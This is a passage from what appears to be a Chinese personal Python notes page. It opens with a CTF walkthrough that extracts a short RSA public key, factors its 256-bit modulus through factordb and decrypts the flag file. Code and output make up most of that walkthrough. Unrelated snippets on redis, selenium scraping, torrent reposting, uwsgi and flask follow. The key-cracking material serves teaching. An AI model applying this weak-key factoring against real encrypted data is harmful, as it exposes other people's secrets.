\uff0c\u89e3\u5bc6\u5176\u4e2d\u7684flag.enc\u6587\u4ef6\u3002 RSA\u662f\u5565 \u00b6 \u7565\u2026(\u8fde\u8fd9\u4e2a\u90fd\u4e0d\u77e5\u9053\u8fd8\u4e0d\u53bbgoogle\uff0c\u4f60\u9002\u4e0d\u9002\u5408CTF\u5fc3\u91cc\u4e00\u70b9B\u6570\u90fd\u6ca1\u6709\u5417) \u7b26\u53f7\u7ea6\u5b9a\uff1a n\u4e00\u4e2a\u5927\u6570\uff0c p\u548cq\u662f\u5b83\u7684\u8d28\u56e0\u5b50\uff0cd\u79c1\u94a5\uff0cm\u4fe1\u606f\u660e\u6587\uff0cc\u4fe1\u606f\u5bc6\u6587 \u7834\u89e3\u7684\u6570\u5b66\u539f\u7406 \u00b6 \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/4078902/cracking-short-rsa-keys Google\u641c\u7d22\u5173\u952e\u8bcd crack rsa key \u7ed9\u5b9a\u516c\u94a5n\u548ce\uff0c\u5047\u5b9a\u6211\u4eec\u6210\u529f\u5206\u89e3n = p * q\uff0c\u90a3\u4e48\u6c42\u51fad d = e^-1 mod phi(n) = e^-1 mod (p-1)*(q-1) \u73b0\u5728\u6211\u4eec\u6709\u4e86\u79c1\u94a5d\uff0c\u53ef\u4ee5\u5bf9\u5bc6\u6587c\u89e3\u5bc6\u5f97\u5230\u660e\u6587m\uff1a m = c^d (mod n) \u5b9e\u73b0\u5b83 \u00b6 \u9898\u76ee\u7ed9\u7684\u516c\u94a5\u662f\u5565\u683c\u5f0f\uff0c\u600e\u4e48\u8bfb\u53d6\u51faN\u548ce? \u00b6 \u9898\u76ee\u7ed9\u7684\u516c\u94a5\u662f\u8fd9\u6837\u7684\uff1a -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMgVHv67DCP6oRAiQJxaEuSluWmE5iZb e+fuqvuwBPUfAgMBAAE= -----END PUBLIC KEY----- \u770b\u8d77\u6765\u5f88\u77ed\uff0c\u4f30\u8ba1\u662f\u53ef\u4ee5\u5206\u89e3\u7684\u6bd4\u8f83\u5c0f\u7684N google\u641c\u7d22\u5173\u952e\u8bcd\uff1aopenssl get n from public key \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key \u4eba\u5bb6\u7ed9\u51fa\u4e86\u8fd9\u6837\u7684\u505a\u6cd5\uff1a(\u73af\u5883Linux\uff0c\u5df2\u7ecf\u5b89\u88c5openssl) # \u4e22\u5f03\u5934\u5c3e\u7684---\u884c\uff0c\u63d0\u53d6\u516c\u94a5\u5185\u5bb9\u5e76\u5408\u5e76\u4e00\u884c\uff08\u8fd9\u662fbase64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff09 PUBKEY=`grep -v -- ----- public.pem | tr -d '\\n'` # \u7f16\u7801\u683c\u5f0f\u662fasn1\uff0c\u67e5\u770b\u8fd9\u79cd\u7f16\u7801\u7684\u683c\u5f0f echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i \u5c06\u8f93\u51fa\uff1a 0:d=0 hl=2 l= 60 cons: SEQUENCE 2:d=1 hl=2 l= 13 cons: SEQUENCE 4:d=2 hl=2 l= 9 prim: OBJECT :rsaEncryption 15:d=2 hl=2 l= 0 prim: NULL 17:d=1 hl=2 l= 43 prim: BIT STRING \u6700\u540e\u4e00\u884cBIT STRING\u5c31\u662f\u6570\u636e\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u504f\u79fb\u4e3a17 \u63d0\u53d6\u51fa\u6765\uff1a echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17 \u5f97\u5230\uff1a 0:d=0 hl=2 l= 40 cons: SEQUENCE 2:d=1 hl=2 l= 33 prim: INTEGER :C8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F 37:d=1 hl=2 l= 3 prim: INTEGER :010001 \u55ef~\u8fd9\u6837\u5c31\u770b\u5230\u5341\u516d\u8fdb\u5236\u7684n\u548ce\u5566\uff0c\u8f6c\u4e3a\u5341\u8fdb\u5236\u7684\u8bddpython\u91cc\u9762\u76f4\u63a5\u8f93\u5165: n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F print(n) \u4e0a\u8ff0python\u6267\u884c\u540e\u5c06\u8f93\u51fa 90499887424928873790510606439768063703452393541528122252967476339871041516831 \u540c\u7406\u6211\u4eec\u5f97\u77e5e=65537\uff0c\u4e00\u822cRSA\u52a0\u5bc6\u90fd\u4f1a\u628a\u516c\u94a5\u7684e\u9009\u4e3a65537 \u600e\u4e48\u5206\u89e3n \u5f97\u5230p\u548cq\uff1f \u00b6 \u4f60\u53ef\u4ee5\u81ea\u5df1\u5199\u4ee3\u7801\uff0c\u7136\u800c\u6211\u61d2\uff0c\u76f4\u63a5\u67e5\u6570\u636e\u5e93\uff1a \u6253\u5f00factordb.com\u8fd9\u4e2a\u795e\u5947\u7684\u7f51\u7ad9\uff0c\u8f93\u5165n\u7684\u503c\u5c31\u80fd\u67e5\u5230\u5206\u89e3\u7ed3\u679c\u5566\uff1a http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831 \u5206\u89e3\u7ed3\u679c\uff1a 9049988742...31<77> = 283194537446483890135816972554288437117<39> \u00b7 319567913424286672035093410391626922443<39> \u597d\u4e86\uff0c\u6211\u4eec\u5c31\u77e5\u9053 p q\u4e86\uff0c\u5177\u4f53\u54ea\u4e2a\u662fp\u54ea\u4e2a\u662fq\u5e76\u4e0d\u91cd\u8981 p=283194537446483890135816972554288437117, q=319567913424286672035093410391626922443 \u600e\u4e48\u8ba1\u7b97\u79c1\u94a5d \u00b6 \u6839\u636eRSA\u539f\u7406\uff0c d = e^-1 mod (p-1)*(q-1)\uff0c \u73b0\u5728\u6211\u4eec\u6709\u4e86p\u548cq\uff0cmod\u540e\u9762\u7684(p-1)*(q-1)\u81ea\u7136\u662f\u53ef\u4ee5\u6c42\u51fa\u6765\u7684 \u4f46e^-1\u662f\u4e2a\u5565\u73a9\u610f\uff1f\u5012\u6570\uff1f \u5012\u6570\u8fd8\u80fd\u6c42\u6a21\uff1f emmm \u5176\u5b9e\u662f\u6c42\u9006\u5143\u5566 \u7136\u800c\u4e0d\u4f1a\u5199\u4ee3\u7801\u600e\u4e48\u529e\uff0c\u5f53\u65f6\u662f\u7ee7\u7eedgoogle\u554a google\u5173\u952e\u8bcd\uff1a python calculate inverse mod \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python \u5f97\u5230\u4ee3\u7801\uff1a def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m \u770b\u4e0d\u61c2\u8fd9\u4ee3\u7801\u5728\u5e72\u5565\uff1f\u6211\u4e5f\u770b\u4e0d\u61c2\uff0c\u4f46\u6ca1\u5173\u7cfb\uff0c\u76f4\u63a5\u7528\u5c31\u884c \u8fd9\u4e48\u591a\u4eba\u70b9\u8d5e\u80af\u5b9a\u662f\u5bf9\u7684 \u90a3\u73b0\u5728\u5c31\u7740\u624b\u628a\u8fd9\u4ee3\u7801\u642c\u8fd0\u5230\u6211\u4eec\u7684py\u4e2d\u54af\uff1a N = 0 xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F e = 0 x10001 p = 283194537446483890135816972554288437117 q = 319567913424286672035093410391626922443 def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m d = modinv ( e , ( p - 1 ) * ( q - 1 )) print ( d ) \u4e0a\u8ff0python\u5c06\u8f93\u51fa34458919248694250828820386546500026880096887166581679876896066449320377773297\uff0c \u771f\u662f\u4e00\u4e2a\u597d\u5927\u7684d\u554a\u3002\u3002\u3002 \u600e\u4e48\u628aflag.enc\u5f53\u6210\u4e00\u4e2aint\u8bfb\u5165\uff1f \u00b6 \u8bd5\u56fe\u7528\u8bb0\u4e8b\u672c\u6253\u5f00flag.enc\uff0c\u4e71\u7801\u4e86\uff1b\u90a3\u7528\u4e8c\u8fdb\u5236\u5f62\u5f0f\u6253\u5f00flag.inc\u6587\u4ef6\u770b\u770b\uff1a emmm\u4e00\u517132\u5b57\u8282\u957f\u7684\u5bc6\u6587\uff0c\u76f4\u63a5\u8bfb\u6587\u4ef6\u5c06\u5f97\u5230bytes strig\uff0c\u600e\u4e48\u628a\u5b83\u8f6c\u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u6574\u6570\u5462\uff1f google\u5173\u952e\u8bcd\uff1a python byte string to int \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/444591/convert-a-string-of-bytes-into-an-int-python \u4eba\u5bb6\u7ed9\u51fa\u4e86python3.2\u4ee5\u540e\u53ef\u4ee5\u7528int.from_bytes\u7684\u65b9\u5f0f\uff0c\u7ee7\u7eed\u5199\u6211\u4eec\u7684py\u54af\uff1a encrypteddata = open('flag.enc','rb').read() c = int.from_bytes(encrypteddata, 'big') print(c) \u8fd9\u91cc\u7684\u2019big\u2019\u8868\u793a\u5927\u7aef\u5b58\u653e\u7684\u65b9\u5f0f\uff0c\u5c31\u662f\u6700\u91cd\u8981\u7684\u90a3\u4e00\u4f4d\u662f\u9760\u5de6\u8fb9\u7684 \u63d2\u4e00\u53e5\uff1a\u901a\u8fc7\u8be2\u95ee\u5176\u4ed6\u5927\u4f6c\uff0c\u6211\u4e5f\u6298\u817e\u51fa\u4e86\u4e00\u79cdnaive\u7684\u65b9\u6cd5\u2014\u2014\u4f7f\u7528binascii\u6a21\u5757\u5148\u8f6c\u4e3ahex\u7f16\u7801\uff0c\u7136\u540ehex\u630916\u5b57\u8282\u8f6cint: encrypteddata = open ( 'flag.enc' , 'rb' ) . read () import binascii c = int ( binascii . b2a_hex ( encrypteddata ) . decode (), 16 ) print ( c ) \u8ba1\u7b97\u660e\u6587 \u00b6 \u516c\u5f0f\uff08\u5bc6\u7801\u5b66\u80af\u5b9a\u8981\u8003\u7684\uff0c\u6240\u4ee5\u518d\u8bb0\u4e00\u6b21\u54af\uff09 m = c^d (mod n) \u95ee\u9898\u6765\u4e86\uff0cd\u662f\u4e2a\u90a3\u4e48\u5927\u7684\u6570\uff0c\u5982\u679c\u76f4\u63a5\u5199\u4e00\u4e2a\uff1a # \u5728python\u91cc**\u8868\u793a\u4e58\u65b9 m = (c**d)%n \u679c\u7136\u8fd0\u884c\u8fd9\u4e2apy\u5c31\u5361\u6b7b\u4e86\uff0c\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u5fc5\u8981\u7b97\u51fa\u7cbe\u786e\u7684c**d\uff0c\u6211\u4eec\u9700\u8981\u8c03\u7528\u5feb\u901f\u7684mod\u4e58\u65b9\u7684\u65b9\u6cd5 google\u5173\u952e\u8bcd\uff1a python mod pow \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/32738637/calculate-mod-using-pow-function-python \u4eba\u5bb6\u8bf4pow\u51fd\u6570\u5c31\u53ef\u4ee5\u63d0\u4f9b\u7b2c3\u4e2a\u53c2\u6570\uff0c\u4f8b\u5982pow(6, 8, 5)\u5c31\u662f 6^8 mod 5 \u90a3\u5c31\u5199\u4ee3\u7801\u54af(\u778e\u5199\uff0cC\u8bed\u8a00\u7684pow\u9700\u8981#include \u90a3\u6211\u5c31\u4e5f\u4ecemath\u5bfc\u5165\u5427)\uff1a from math import pow m = pow ( c , d , n ) \u7136\u800c\u547d\u9014\u591a\u821b\uff0c\u679c\u7136\u62a5\u9519\uff1a Traceback (most recent call last): File \"run.py\", line 35, in <module> m = pow(c,d,n) TypeError: pow expected 2 arguments, got 3 emmm\u2026 \u5947\u4e86\u602a\u4e86\uff0c\u8fd9\u662f\u4ec0\u4e48\u9b3c\u561b\uff0c\u8bf4\u597d\u7684\u652f\u6301\u7b2c\u4e09\u4e2a\u53c2\u6570\u5462\uff0c\u7ffb\u56de\u53bb\u4ed4\u7ec6\u770b\u4eba\u5bb6\u7ed9\u7684 \u6587\u6863\u94fe\u63a5 \u55ef\uff1f\u8fd9\u6587\u6863\u7684\u6807\u9898\u5c31\u662fBuilt-in Functions\uff0c\u6211\u61c2\u4e86\uff01 \u652f\u6301\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684pow\u51fd\u6570\u662f\u5185\u7f6e\u7684\u90a3\u4e2a\uff0c\u800c\u4e0d\u662fmath\u5e93\u63d0\u4f9b\u7684\uff0c\u5220\u6389 from math import pow \u8fd9\u4e00\u53e5\u5c31\u597d\u4e86 \u6211\u4eec\u7684py\u53c8\u52a0\u4e0a\u4e86\u4e24\u884c\uff1a m = pow(c,d,n) print(m) \u5f97\u5230\u8f93\u51fa 4114174865819530012247735243997890458185276719507135882385278623252053258 \u660e\u6587\u8fd9\u4e48\u4e00\u4e2a\u5927\u6570 \u6211\u8981\u7684flag\u5462\uff1f \u00b6 cy\u6253\u5f00\u4e86\u4ed6\u7684\u7b14\u8bb0\u672c https://py3.io/Python.html#bytes \u67e5\u5230\u4e86 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32 \u548c \u62ff\u5230\u4e00\u4e2aint\u8f6c\u5b57\u7b26\u4e32 \u7684\u65b9\u6cd5\uff1a from base64 import b16decode print ( b16decode ( hex ( m )[ 2 :] . upper () ) ) \u679c\u7136 \u53c8tm\u51fa\u9519\u4e86\uff1a Traceback (most recent call last): File \"run.py\", line 37, in <module> print( b16decode( hex(m)[2:].upper() ) ) File \"/usr/lib/python3.5/base64.py\", line 276, in b16decode return binascii.unhexlify(s) binascii.Error: Odd-length string odd-length\u5565\u610f\u601d\uff1f\u5947\u6570\u957f\u5ea6\uff1f\u5bf9\u5662 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u80af\u5b9a\u8981\u5076\u6570\u957f\u5ea6\u624d\u884c\uff08\u4e24\u4e2a\u4e00\u7ec4\u8868\u793a\u4e00\u4e2a\u5b57\u8282\u561b\uff09 \u90a3\u4e48\u5c31\u524d\u9762\u8865\u4e2a0\u54af py\u4ee3\u7801\u5982\u4e0b\uff1a\uff08\u5176\u5b9e\u4f60\u4e5f\u53ef\u4ee5\u8bd5\u8bd5int.to_bytes\u65b9\u6cd5\uff09 plaindata = hex(m)[2:].upper() if len(plaindata)%2 : plaindata = \"0\"+plaindata print(b16decode(plaindata)) \u8f93\u51fa\uff1a b'\\x02T\\x1b:(\\x02\\xb9\\x8c8\\xbb\\x00CTF{256i3_n0t_SAfe}\\n' \u554a\u54c8\uff01 \u603b\u7b97\u80fd\u641e\u5b9a\u5566\uff0cflag\u5230\u624b\uff01 \u5b8c\u6574\u7684\u4ee3\u7801 \u00b6 # parse public key: https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key # PUBKEY=`grep -v -- ----- public.pem | tr -d '\\n'` # echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i # echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17 n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F e = 0x10001 print ( n ) # visit http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831 p = 283194537446483890135816972554288437117 q = 319567913424286672035093410391626922443 def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m d = modinv ( e , ( p - 1 ) * ( q - 1 )) print ( d ) encrypteddata = open ( 'flag.enc' , 'rb' ) . read () import binascii c = int ( binascii . b2a_hex ( encrypteddata ) . decode (), 16 ) print ( c ) c = int . from_bytes ( encrypteddata , 'big' ) print ( c ) m = pow ( c , d , n ) print ( m ) from base64 import b16decode plaindata = hex ( m )[ 2 :] . upper () if len ( plaindata ) % 2 : plaindata = \"0\" + plaindata print ( b16decode ( plaindata )) \u65f6\u95f4\u6233\u4e0e\u5b57\u7b26\u4e32\u76f8\u4e92\u8f6c\u6362 \u00b6 import time \u5f97\u5230\u5f53\u524d\u65f6\u95f4\u6233\uff1a int(time.time()) \u5f97\u5230\u5f53\u524d\u65f6\u95f4\u5b57\u7b26\u4e32\uff1atime.strftime(\u201c%Y-%m-%d %H:%M:%S\u201d) \u65f6\u95f4\u62331381419600\u8f6c\u5b57\u7b26\u4e32\uff1atime.strftime(\u201c%Y-%m-%d %H:%M:%S\u201d, time.localtime(1381419600)) \u5b57\u7b26\u4e32\u201d2013-10-10 23:40:00\u201d\u8f6c\u65f6\u95f4\u6233\uff1aint(time.mktime(time.strptime(\u201c2013-10-10 23:40:00\u201d,\u201d%Y-%m-%d %H:%M:%S\u201d))) \u7528redis\u5b58\u50a8\u5b57\u5178 \u00b6 \u5047\u8bbe\u5b58\u50a8\u4e00\u4e2a\u7528\u6237\u540d\u5bf9\u5e94\u7528\u6237ID\u7684\u5b57\u5178\uff0c\u540d\u79f0\u4e3aUSERS\uff0c\u4f8b\u5982{\u201czhangsan\u201d:1, \u201clisi\u201d:2} import redis r = redis . StrictRedis ( host = 'localhost' , port = 6379 , db = 1 ) #db\u53c2\u6570\u53ef\u4ee5\u7406\u89e3\u4e3a\u547d\u540d\u7a7a\u95f4 assert r . ping () # \u662f\u5426\u6210\u529f\u8fde\u4e0a USERS = { \"zhangsan\" : 1 , \"lisi\" : 2 } # \u5b58\u50a8\u5b57\u5178 r . hmset ( \"USERS\" , USERS ) # \u83b7\u5f97\u5df2\u7ecf\u5b58\u50a8\u7684\u5b57\u5178\u91cc\u9762\u6709\u54ea\u4e9b\u952e\uff0c\u8fd4\u56debytes\u7684list KEYS = r . hkeys ( \"USERS\" ) # \u83b7\u5f97\u6574\u4e2a\u5b57\u5178\u5e76\u8f6c\u6362\u56de\u539f\u6765\u7684\u7c7b\u578b USERS1 = { i . decode (): int ( j ) for i , j in r . hgetall ( \"USERS\" ) . items ()} # \u4fee\u6539\u5b57\u5178\u4e2d\u4e00\u4e2akey\u7684value r . hset ( \"USERS\" , \"zhangsan\" , 3 ) # \u5220\u9664\u5b58\u50a8\u7684\u5b57\u5178\uff0c\u53ea\u80fd\u4e00\u4e2a\u4e2a\u5220\uff0c\u5148\u8981hkeys\u83b7\u53d6\u6709\u54ea\u4e9b\u952e _ = [ r . hdel ( \"USERS\" , key ) for key in r . hkeys ( \"USERS\" ) ] # \u626b\u63cf\u5f0f\u83b7\u5f97\u5df2\u7ecf\u5b58\u50a8\u7684\u5b57\u5178\u91cc\u9762\u6709\u54ea\u4e9b\u952e ## \u5982\u679c\u5b57\u5178\u91cc\u9762\u5b58\u50a8\u4e86\u592a\u591a\u4e1c\u897f\uff0c\u6267\u884cKEYS\u4f1a\u5361\u4f4f\u6574\u4e2aredis\uff0c\u7528hscan\u662f\u66f4\u597d\u7684\u9009\u62e9 ## \u8fd9\u91cc\u5148\u751f\u6210\u4e00\u4e2a\u6bd4\u8f83\u5927\u7684\u5b57\u5178\u5b58\u8fdb\u53bb import random , string randomstr = lambda n : \"\" . join ( random . sample ( string . ascii_letters , n )) USERS = { randomstr ( 10 ): random . randint ( 1 , 10000 ) for _ in range ( 10000 )} # \u751f\u6210\u4e00\u4e2a1w\u6761\u8bb0\u5f55\u7684\u5b57\u5178 r . hmset ( \"USERS\" , USERS ) # \u5b58\u8fdb\u53bb ## \u5faa\u73afhscan cursor , result = r . hscan ( \"USERS\" ) while cursor : cursor , tmp = r . hscan ( \"USERS\" , cursor ) result . update ( tmp ) USERS2 = { i . decode (): int ( j ) for i , j in result . items ()} #\u4ecebytes\u8f6c\u4e3a\u539f\u6765\u7684\u683c\u5f0f assert USERS == USERS2 #\u5b58\u8fdb\u53bb\u7684\u4e0e\u53d6\u51fa\u6765\u7684\u5e94\u8be5\u76f8\u540c \u642c\u8fd0\u79cd\u5b50 \u4ece\u5317\u90ae\u4eba\u642c\u8fd0\u5230NexusHD \u00b6 \u4ee3\u7801\uff1a code/autoseed_byr2nhd.py \u4f9d\u8d56\u4e8e EasyLogin \uff0c\u4ee5\u53ca pip3 install transmissionrpc python-resize-image \u8fd0\u884c\u9700\u8981\u63d0\u4f9bbyr\u548cNHD\u7684\u767b\u5f55cookie\uff0c\u4ee5\u53catransmission\u8fde\u63a5\u4fe1\u606f python selenium+Docker chrome headless\u722c\u590d\u6742\u7f51\u9875 \u00b6 \u4f8b\u5b50\uff1a\u963f\u91cc\u4e91\u6240\u6709\u57df\u540d\u4ef7\u683c\u9875\u9762 https://wanwang.aliyun.com/help/price.html \u4ece\u7f51\u7edc\u8bf7\u6c42\u770b\u51fa\u5176\u4ef7\u683c\u63a5\u53e3\u6709\u591a\u4e2a\uff0c\u800c\u4e14\u8f83\u4e3a\u590d\u6742\uff1b\u90a3\u5c31\u4e0d\u59a8\u8bd5\u8bd5\u7528selenium\u8ba9chrome headless\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\uff0c\u52a0\u8f7d\u6e32\u67d3\u5b8c\u6210\u540e\u6211\u4eec\u518d\u83b7\u53d6\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u6b64\u65f6\u6e90\u4ee3\u7801\u91cc\u9762\u5c31\u6709\u4e86\u5b8c\u6574\u7684\u4ef7\u683c\u6570\u636e \u8fd0\u884c\u73af\u5883\uff1a\u53ea\u9700\u8981Docker\u548cPython3\uff0c\u65e0\u9700\u684c\u9762\u73af\u5883 \u955c\u50cf\u53c2\u8003\uff1ahttps://hub.docker.com/r/selenium/standalone-chrome/ \u5148\u8dd1\u8d77\u6765\u5bb9\u5668\u5457\uff0c\u8fd9\u6837\u5c31\u8fd0\u884c\u4e86selenium server\uff0c\u4e3b\u673a\u66b4\u9732\u4e86\u4e00\u4e2a6666\u7aef\u53e3\uff0c\uff1a docker run -d -p 6666:4444 -v /dev/shm:/dev/shm selenium/standalone-chrome \u5b89\u88c5Python\u5305\uff1a pip3 install selenium \u8c03\u7528\u4ee3\u7801\uff0c\u722c\u53d6url\uff0c\u5f97\u5230\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u5176\u4e2d127.0.0.1\u76f8\u5e94\u5730\u4fee\u6539\u4e3aDocker\u4e3b\u673a\u7684IP: url = \"https://wanwang.aliyun.com/help/price.html\" from selenium import webdriver from selenium.webdriver.common.desired_capabilities import DesiredCapabilities driver = webdriver . Remote ( command_executor = 'http://127.0.0.1:6666/wd/hub' , desired_capabilities = DesiredCapabilities . CHROME ) driver . get ( url ) html = driver . page_source with open ( \"result.html\" , \"w\" , encoding = \"utf-8\" ) as fp : fp . write ( html ) driver . quit () #\u4e00\u5b9a\u8981\u8bb0\u5f97\u6e05\u7406\u6389Chrome\u8fdb\u7a0b \u5426\u5219\u5185\u5b58\u4f1a\u5360\u6ee1 \u5982\u679c\u6ca1\u6709\u5728\u4ee3\u7801\u91cc\u9762\u6e05\u7406Chrome\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u91cc\u9762\u8fdb\u5165Console\uff0c\u5728\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u8fd0\u884c\u7684Session (Chrome\u8fdb\u7a0b) \uff0c\u5bf9\u5f53\u524d\u9875\u9762\u67e5\u770b\u9875\u9762\u622a\u56fe\uff1a http://127.0.0.1:6666/wd/hub/static/resource/hub.html python\u4e22\u5f03root\u6743\u9650 \u00b6 \u5982\u679cpython\u9700\u8981\u76d1\u542c80\u7aef\u53e3\uff0c\u7b80\u5355\u65b9\u5f0f\u5c31\u662f\u76f4\u63a5\u7528root\u6743\u9650\u542f\u52a8\uff0c\u4f46\u542f\u52a8\u540e\u53ef\u4ee5\u4e22\u5f03root\u6743\u9650\u6765\u63d0\u9ad8\u5b89\u5168\u6027 code from https://stackoverflow.com/questions/2699907/dropping-root-permissions-in-python import os , pwd , grp def drop_privileges ( uid_name = 'nobody' , gid_name = 'nogroup' ): if os . getuid () != 0 : # We're not root so, like, whatever dude return # Get the uid/gid from the name running_uid = pwd . getpwnam ( uid_name ) . pw_uid running_gid = grp . getgrnam ( gid_name ) . gr_gid # Remove group privileges os . setgroups ([]) # Try setting the new uid/gid os . setgid ( running_gid ) os . setuid ( running_uid ) python transmissionrpc \u00b6 \u4e0b\u8ff0\u4e3b\u8981\u4ecb\u7ecd transmissionrpc \u8fd9\u4e2a\u5e93\u7684\u4f7f\u7528 \u4e0a\u4f20\u4e00\u4e2a\u79cd\u5b50 \u5f00\u59cb\u4e0b\u8f7d \u00b6 \u4f7f\u7528Client\u7684add_torrent\u65b9\u6cd5\uff0c\u4f20\u5165\u79cd\u5b50\u6587\u4ef6\u7684base64 def upload_transmission ( thost , tport , tuser , tpassword , filename ): tc = transmissionrpc . Client ( thost , port = tport , user = tuser , password = tpassword ) return tc . add_torrent ( base64 . b64encode ( open ( filename , \"rb\" ) . read ()) . decode ()) \u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u4e0d\u5b8c\u6574\u7684torrent\u5bf9\u8c61 \u83b7\u53d6\u5b8c\u6574\u7684torrent\u5bf9\u8c61 \u00b6 torrent_id = torrent.id full_torrent = tc.get_torrent(torrent_id) \u5176\u4e2d\u5c31\u6709\u72b6\u6001\u548c\u8fdb\u5ea6\u4fe1\u606f print(full_torrent.status, full_torrent.progress) \u7ed9\u79cd\u5b50\u589e\u52a0\u4e00\u4e2atracker \u00b6 \u8fd9\u6837\u53ef\u4ee5\u628apt\u7ad9\u70b9\u7684\u79cd\u5b50\u8f6c\u5230OpenTracker\uff0c\u65e0\u9700\u91cd\u65b0\u6821\u9a8c\u79cd\u5b50\uff08\u4f46\u4f20\u5230\u65b0\u7684pt\u7ad9\u70b9infohash\u4f1a\u53d8\uff0c\u53ea\u80fd\u4f20\u65b0\u79cd\u5b50\u91cd\u65b0\u6821\u9a8c\uff09 transmissionrpc\u672c\u8eab\u4f3c\u4e4e\u6ca1\u6709\u66b4\u9732\u51fatrackerAdd\u7684\u65b9\u6cd5\uff0c\u8fd9\u662f\u7ed3\u5408\u6d4f\u89c8\u5668\u548c\u7ffb\u9605\u4ee3\u7801\u81ea\u5df1\u8bd5\u51fa\u6765\u7684 torrent . _client . _request ( 'torrent-set' , { \"trackerAdd\" : [ new_tracker_url ] } , torrent . id , True ) \u4fee\u6539\u4e00\u4e2a.torrent\u6587\u4ef6\u7684tracker \u00b6 \u4f7f\u7528torf\u5e93\uff0c\u8fd9\u4e2a\u5e93\u4f7f\u7528\u4e86python3.6\u624d\u652f\u6301\u7684\u7279\u6027\uff0c\u4f9d\u8d56\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001dict\u904d\u5386\u7684\u6709\u5e8f\u6027 \u6211\u4fee\u6539\u540e\u7684\u7248\u672c\u4e0b\u8f7d\uff0c\u652f\u6301py3.5\uff1ahttps://d.py3.io/torf.zip \u4ee3\u7801\uff1a t = torf . Torrent . read ( torrent_filename ) t . trackers =[ [new_tracker_url ] ] t . write ( \"new.torrent\" ) uwsgi\u4f18\u96c5\u91cd\u542f \u00b6 \u53c2\u8003\uff1ahttp://uwsgi-docs.readthedocs.io/en/latest/articles/TheArtOfGracefulReloading.html \u5728uwsgi.ini\u4e2d\u6dfb\u52a0\u4e00\u884c\uff1a master-fifo = /tmp/uwsgififo \u9700\u8981\u91cd\u542f\u7684\u65f6\u5019\u5c31\uff1a echo r>/tmp/uwsgififo \u6587\u4ef6\u6253\u5f00\u65b9\u5f0f\u5fc5\u987b\u662f\u201dw\u201d\u800c\u4e0d\u80fd\u662f\u201da\u201d\uff1a open(\"/tmp/uwsgififo\", \"w\").write(\"r\") flask\u8bbe\u7f6e\u4e00\u5806\u9759\u6001\u76ee\u5f55 \u00b6 from flask import Flask , render_template , Blueprint , request , redirect , Markup app = Flask ( __name__ ) for path in [ 'pic' , 'skin' , 'images' , '\u66f4\u591a\u9759\u6001\u76ee\u5f55' ]: blueprint = Blueprint ( path , __name__ , static_url_path = '/' + path , static_folder = path ) app . register_blueprint ( blueprint ) Python3.5 open\u6253\u5f00\u6587\u4ef6\u9ed8\u8ba4\u4f7f\u7528utf-8 \u00b6 Windows\u4e0bopen\u6253\u5f00\u6587\u4ef6\u603b\u662f\u4f1a\u4f7f\u7528gbk\uff0c\u914d\u7f6e\u73af\u5883\u53d8\u91cf\u5982PYTHONIOENCODING\u90fd\u6ca1\u7528\uff0c\u5c31\u5f88\u6c14\uff0c\u96be\u9053\u53ea\u80fd\u6bcf\u6b21open\u90fd\u4fdd\u8bc1\u5199\u4e0aencoding=\u201dutf-8\u201d\u561b\uff1f\u5f53\u7136\u4e0d\u5fc5 google\u641c\u7d22\u5173\u952e\u8bcd\uff1awindows python3 change open file encoding \u89e3\u51b3\u65b9\u6848\uff1a\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/31469707/changing-the-locale-preferred-encoding-in-python-3-in-windows \u6dfb\u52a0\u4ee3\u7801\uff1a\u7531\u4e8e\u53ea\u6709windows\u624d\u9700\u8981\u8fd9\u4e48\u5904\u7406\uff0c\u6240\u4ee5\u5148\u5224\u65ad\u64cd\u4f5c\u7cfb\u7edf import sys if sys . platform . startswith ( \"win\" ): import _locale _locale . 